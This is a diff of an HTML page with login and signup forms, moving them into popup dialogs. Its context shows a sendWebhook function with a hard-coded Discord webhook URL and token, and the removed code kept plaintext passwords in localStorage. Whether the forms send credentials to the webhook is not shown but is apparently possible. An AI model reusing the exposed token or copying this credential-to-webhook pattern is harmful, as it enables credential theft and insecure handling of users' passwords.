@@ -46,8 +46,48 @@
     .form-container button {
       padding: 8px 12px;
     }
+
+    .popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #fff;
+      width: 300px;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+      display: none;
+    }
+
+    .popup.show {
+      display: block;
+    }
+
+    .popup h2 {
+      margin-top: 0;
+    }
+
+    .popup label,
+    .popup input[type="text"],
+    .popup input[type="password"],
+    .popup button {
+      display: block;
+      margin-bottom: 10px;
+    }
+
+    .popup button {
+      padding: 8px 12px;
+    }
   </style>
   <script>
+    function openPopup(popupId) {
+      document.getElementById(popupId).classList.add("show");
+    }
+
+    function closePopup(popupId) {
+      document.getElementById(popupId).classList.remove("show");
+    }
+
     function sendWebhook(content) {
       const webhookUrl = "https://discord.com/api/webhooks/1114747356055879781/7fH1tMXA2cJ8neQ3o4pMsZfnJwqAsBFt3xHOIcjHzrs3JZrJ5Fnun5zHluFw3bR5k60B";
 
@@ -99,39 +139,40 @@
 
   <div class="container">
     <div class="form-container">
-      <h2>Login</h2>
-      <form onsubmit="login(event)">
-        <label for="loginUsername">Username:</label>
-        <input type="text" id="loginUsername" required>
-        <label for="loginPassword">Password:</label>
-        <input type="password" id="loginPassword" required>
-        <button type="submit">Login</button>
-      </form>
+      <button onclick="openPopup('loginPopup')">Login</button>
     </div>
 
     <div class="form-container">
-      <h2>Signup</h2>
-      <form onsubmit="signup(event)">
-        <label for="signupUsername">Username:</label>
-        <input type="text" id="signupUsername" required>
-        <label for="signupEmail">Email:</label>
-        <input type="email" id="signupEmail" required>
-        <label for="signupPassword">Password:</label>
-        <input type="password" id="signupPassword" required>
-        <button type="submit">Signup</button>
-      </form>
+      <button onclick="openPopup('signupPopup')">Signup</button>
     </div>
   </div>
 
-  <script>
-    // Simulating cloud storage using browser's localStorage
-    function saveUserToCloud(username, email, password) {
-      const existingUsers = JSON.parse(localStorage.getItem("users")) || [];
-      const newUser = { username, email, password };
-      existingUsers.push(newUser);
-      localStorage.setItem("users", JSON.stringify(existingUsers));
-    }
-  </script>
+  <div id="loginPopup" class="popup">
+    <h2>Login</h2>
+    <form onsubmit="login(event)">
+      <label for="loginUsername">Username:</label>
+      <input type="text" id="loginUsername" required>
+      <label for="loginPassword">Password:</label>
+      <input type="password" id="loginPassword" required>
+      <button type="submit">Login</button>
+      <button type="button" onclick="closePopup('loginPopup')">Close</button>
+    </form>
+  </div>
+
+  <div id="signupPopup" class="popup">
+    <h2>Signup</h2>
+    <form onsubmit="signup(event)">
+      <label for="signupUsername">Username:</label>
+      <input type="text" id="signupUsername" required>
+      <label for="signupEmail">Email:</label>
+      <input type="email" id="signupEmail" required>
+      <label for="signupPassword">Password:</label>
+      <input type="password" id="signupPassword" required>
+      <button type="submit">Signup</button>
+      <button type="button" onclick="closePopup('signupPopup')">Close</button>
+    </form>
+  </div>
+
 </body>
 
 </html>
